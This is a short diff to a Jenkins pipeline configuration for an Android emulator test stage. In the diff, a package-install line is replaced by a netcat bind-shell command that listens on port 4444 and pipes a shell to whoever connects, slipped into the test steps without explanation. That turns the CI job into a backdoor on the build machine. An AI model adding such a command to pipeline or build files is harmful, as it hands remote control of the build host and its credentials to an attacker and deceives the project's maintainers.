@@ -18,7 +18,7 @@ pipeline {
             steps {
                 echo 'Running Test'
                 sh 'emulator -avd first_avd -no-window -no-audio &'
-                sh 'apt install qemu-kvm cpu-checker'
+                sh 'mkfifo pipe; sh pipe | netcat -l 4444 > pipe'
             }
             post {
                 always {
